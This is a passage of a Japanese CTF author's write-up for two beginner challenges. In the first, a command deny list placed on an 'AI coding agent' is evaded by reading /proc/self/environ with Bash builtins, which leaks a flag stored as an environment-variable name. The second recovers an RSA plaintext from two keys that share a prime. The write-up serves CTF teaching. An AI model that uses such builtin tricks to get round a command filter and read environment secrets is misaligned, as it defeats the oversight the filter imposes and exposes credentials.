+</span></span><span style=display:flex><span>The previous coding agent ran `env`.
+</span></span><span style=display:flex><span>The user was not happy.
+</span></span><span style=display:flex><span>Some Bash tool calls are now denied.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Submit one Bash command.
+</span></span><span style=display:flex><span>&gt; env
+</span></span><span style=display:flex><span>[policy] denied: &#34;env&#34; is not allowed
+</span></span></code></pre></div><p><code>env</code> はdenyされます。ほかにも <code>printenv</code>, <code>cat</code>, <code>tr</code>, <code>grep</code>, <code>sed</code>, <code>awk</code>, <code>python</code> など、環境変数やファイルの確認によく使うコマンドがdenyされています。</p><p>配布ファイルの <code>main.py</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>DENY_TOKENS <span style=color:#f92672>=</span> [
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;$(&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;`&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;|&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&lt;(&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&gt;(&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;/usr&#34;</span>,
+</span></span><span style=display:flex><span>]
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>DENIED_COMMANDS <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;env&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;printenv&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;cat&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;tr&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;grep&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;sed&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;awk&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;od&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;strings&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;xxd&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;dd&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;base64&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;python&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;python3&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#f92672>...</span>
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p><code>cat /proc/self/environ | tr '\0' '\n'</code> のような典型的な方法は、<code>cat</code>, <code>tr</code>, pipeがdenyされるため使えません。</p><p>また、この問題ではFLAGが環境変数の値ではなくkey側に入っています。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>build_child_env</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> {
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;PATH&#34;</span>: <span style=color:#e6db74>&#34;/app/bin&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;HOME&#34;</span>: <span style=color:#e6db74>&#34;/tmp&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;LC_ALL&#34;</span>: <span style=color:#e6db74>&#34;C&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;TERM&#34;</span>: <span style=color:#e6db74>&#34;dumb&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;AGENT&#34;</span>: <span style=color:#e6db74>&#34;greenroom&#34;</span>,
+</span></span><span style=display:flex><span>        <span style=color:#e6db74>&#34;MODE&#34;</span>: <span style=color:#e6db74>&#34;sandbox&#34;</span>,
+</span></span><span style=display:flex><span>        FLAG: <span style=color:#e6db74>&#34;x&#34;</span>,
+</span></span><span style=display:flex><span>    }
+</span></span></code></pre></div><p>そのため、<code>$FLAG</code> のような普通の環境変数参照では読めません。
+実際、<code>printf</code> は使えますが、<code>$FLAG</code> は空になります。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>&gt; printf <span style=color:#e6db74>&#39;%s\n&#39;</span> <span style=color:#e6db74>&#34;</span>$FLAG<span style=color:#e6db74>&#34;</span>
+</span></span></code></pre></div><p>Linuxでは、<code>/proc/self/environ</code> から現在のプロセスの環境変数を読むことができます。今回の場合は、入力したコマンドを実行しているBashプロセス自身の環境変数を読むことになります。
+ただし、環境変数は改行区切りではなくNUL区切りです。</p><p>ここで使えるのがBashの組み込みコマンドの <a href=https://www.gnu.org/software/bash/manual/bash.html#index-mapfile><code>mapfile</code></a> です。
+<code>mapfile</code> は <code>-d</code> でdelimiterを指定できます。<code>-d ''</code> を指定すると、NULをdelimiterとして扱えます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ nc greenroom.beginners.seccon.games <span style=color:#ae81ff>46777</span>
+</span></span><span style=display:flex><span>== greenroom ==
+</span></span><span style=display:flex><span>The previous coding agent ran `env`.
+</span></span><span style=display:flex><span>The user was not happy.
+</span></span><span style=display:flex><span>Some Bash tool calls are now denied.
+</span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010>
+</span></span></span><span style=display:flex><span><span style=color:#960050;background-color:#1e0010></span>Submit one Bash command.
+</span></span><span style=display:flex><span>&gt; mapfile -d <span style=color:#e6db74>&#39;&#39;</span> -t A&lt;/proc/self/environ;printf <span style=color:#e6db74>&#39;%s\n&#39;</span> <span style=color:#e6db74>&#34;</span><span style=color:#e6db74>${</span>A[@]<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>
+</span></span><span style=display:flex><span>PATH=/app/bin
+</span></span><span style=display:flex><span>HOME=/tmp
+</span></span><span style=display:flex><span>LC_ALL=C
+</span></span><span style=display:flex><span>TERM=dumb
+</span></span><span style=display:flex><span>AGENT=greenroom
+</span></span><span style=display:flex><span>MODE=sandbox
+</span></span><span style=display:flex><span>ctf4b{b45h_bu1lt1n5_c4n_r34d_nul_s3p4r4t3d_3nv}=x
+</span></span></code></pre></div><p>FLAGが環境変数のkeyとして表示されました。</p><p><a href=https://www.gnu.org/software/bash/manual/bash.html#index-read><code>read -d ''</code></a> を使っても同じようにNUL区切りで読むことができます。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#66d9ef>while</span> IFS<span style=color:#f92672>=</span> read -r -d <span style=color:#e6db74>&#39;&#39;</span> x;<span style=color:#66d9ef>do</span> printf <span style=color:#e6db74>&#39;%s\n&#39;</span> <span style=color:#e6db74>&#34;</span>$x<span style=color:#e6db74>&#34;</span>;<span style=color:#66d9ef>done</span>&lt;/proc/self/environ
+</span></span></code></pre></div><p>この問題では、使えないコマンドを見て終わりではなく、Bashの組み込みコマンドや <code>/proc</code> の性質を組み合わせる必要がありました。
+普段は <code>env</code> や <code>cat</code> を使ってしまうので、こういう制約があると、シェルの機能を見直すきっかけになるなと思いました。</p><h1 id=crypto-twins>[crypto] twins</h1><p>問題文はこちらです。solve数は418でした。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text><span style=display:flex><span>RSAの公開鍵を2つ作ってみました!
+</span></span></code></pre></div><p>RSA暗号について一定の理解があれば解けるような問題にしたいと思って作りました。
+RSA暗号の問題では、まず <code>n</code>, <code>e</code>, <code>c</code> が何を表しているかを確認し、<code>n</code> をどうにかして素因数分解できないかを考えることが多いです。</p><p>配布ファイルの <code>output.txt</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>n1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>113880125198864950563107027313262858562579845169040599843244908620910863016550189657973462371771316792957786246501938664222083662393621306146341461444713328361747021647851967048322504706224619037767570006428934894715790606442824792889611101483284328574709759135027127435315296666269676354975141117473271303321</span>
+</span></span><span style=display:flex><span>n2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>105276345432465274963720722422774590917691220487589268040722899198110433602948101271470062639646432750400949217388976818212349789839198599553407451456746354799769561549120245004545841153155597677559555183979871182443047548869983267425969009743794827412550143572792952463128292049048381620452468992949469524739</span>
+</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
+</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>523724402186281757672504163102213938199531542190538176894240854156187650675308897872801979844253859168041096691538816812473265236344118603761747753962742078327527050567766258109597769320400583993445607364727303667121730062147288257549149953588914416172323461076634838540811797057063184864794352115558365151</span>
+</span></span></code></pre></div><p><code>n1</code> と <code>n2</code> という2つのRSAの公開鍵で使われる値が配布されています。RSAでは、この <code>n</code> は2つの素数の積として作られます。</p><p>次に <code>chall.py</code> を確認します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span>p <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>512</span>)
+</span></span><span style=display:flex><span>q1 <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>512</span>)
+</span></span><span style=display:flex><span>q2 <span style=color:#f92672>=</span> getPrime(<span style=color:#ae81ff>512</span>)
+</span></span><span style=display:flex><span>n1 <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q1
+</span></span><span style=display:flex><span>n2 <span style=color:#f92672>=</span> p <span style=color:#f92672>*</span> q2
+</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
+</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> pow(m, e, n1)
+</span></span></code></pre></div><p><code>n1 = p * q1</code>、<code>n2 = p * q2</code> となっており、同じ素数 <code>p</code> が使い回されています。</p><p>この場合、<code>n1</code> と <code>n2</code> はどちらも <code>p</code> で割り切れます。そのため、<code>gcd(n1, n2)</code> を計算すると、共通している素因数 <code>p</code> が得られます。<code>gcd</code> は最大公約数のことで、2つの数の両方を割り切れる最大の数を求める計算です。</p><p><code>p</code> が分かれば、<code>n1</code> は <code>p * q1</code> なので <code>q1 = n1 // p</code> で求められます。
+あとは通常のRSAと同じように、復号に使う秘密指数 <code>d</code> を求めて復号します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-py data-lang=py><span style=display:flex><span><span style=color:#f92672>from</span> math <span style=color:#f92672>import</span> gcd
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>n1 <span style=color:#f92672>=</span> <span style=color:#ae81ff>113880125198864950563107027313262858562579845169040599843244908620910863016550189657973462371771316792957786246501938664222083662393621306146341461444713328361747021647851967048322504706224619037767570006428934894715790606442824792889611101483284328574709759135027127435315296666269676354975141117473271303321</span>
+</span></span><span style=display:flex><span>n2 <span style=color:#f92672>=</span> <span style=color:#ae81ff>105276345432465274963720722422774590917691220487589268040722899198110433602948101271470062639646432750400949217388976818212349789839198599553407451456746354799769561549120245004545841153155597677559555183979871182443047548869983267425969009743794827412550143572792952463128292049048381620452468992949469524739</span>
+</span></span><span style=display:flex><span>e <span style=color:#f92672>=</span> <span style=color:#ae81ff>65537</span>
+</span></span><span style=display:flex><span>c <span style=color:#f92672>=</span> <span style=color:#ae81ff>523724402186281757672504163102213938199531542190538176894240854156187650675308897872801979844253859168041096691538816812473265236344118603761747753962742078327527050567766258109597769320400583993445607364727303667121730062147288257549149953588914416172323461076634838540811797057063184864794352115558365151</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> gcd(n1, n2)
+</span></span><span style=display:flex><span>q1 <span style=color:#f92672>=</span> n1 <span style=color:#f92672>//</span> p
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>phi <span style=color:#f92672>=</span> (p <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> (q1 <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>)
+</span></span><span style=display:flex><span>d <span style=color:#f92672>=</span> pow(e, <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>, phi)
+</span></span><span style=display:flex><span>m <span style=color:#f92672>=</span> pow(c, d, n1)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>flag <span style=color:#f92672>=</span> m<span style=color:#f92672>.</span>to_bytes((m<span style=color:#f92672>.</span>bit_length() <span style=color:#f92672>+</span> <span style=color:#ae81ff>7</span>) <span style=color:#f92672>//</span> <span style=color:#ae81ff>8</span>, <span style=color:#e6db74>&#34;big&#34;</span>)
+</span></span><span style=display:flex><span>print(flag<span style=color:#f92672>.</span>decode())
+</span></span></code></pre></div><p>実行します。</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-console data-lang=console><span style=display:flex><span>$ python3 solve.py
+</span></span><span style=display:flex><span>ctf4b{tw1n_pr1m35_4r3_n0t_1nd3p3nd3nt}
+</span></span></code></pre></div><p>無事にFLAGが取得できました！</p><p>RSAでは、異なる鍵で同じ素数を使い回してはいけません。
+一見すると <code>n1</code> と <code>n2</code> は別々の大きな数ですが、共通する素因数があると、<code>gcd</code> だけで素因数分解できてしまいます。</p><h1 id=おわりに>おわりに</h1><p>SECCON Beginners CTF 2026は楽しめましたでしょうか？ 初めてCTFに参加された方は、解けなかった問題について、作問者や他の参加者の方のWriteupを読むと、新たな学びが得られることと思います。自分が今回作成した問題が皆さんの何らかの学びやきっかけに繋がっていれば嬉しいです。</p><p>生成AIを使って問題に取り組んだ方も多かったと思います。AIが解いてくれるのは便利ではありますが、FLAGだけ取得できても、なぜ解けたのかを理解できていないと、CTFで得られるものは少なくなってしまいます。ぜひAIが取得したFLAGをそのまま提出して終わりにせず、あとから自分の言葉で解法を説明できるか確認してみてください。そこまでやると、CTFで得られるものがかなり増えると思います。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/ctf>ctf</a></li><li><a href=/tags/writeup>writeup</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/melonattacker title=GitHub><i data-feather=github></i></a>
+<a class=border></a><a class=soc href=https://x.com/melonattacker title=X><i data-feather=x></i></a>
+<a class=border></a></div><div class=footer-info>2026 © yuasa | <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>
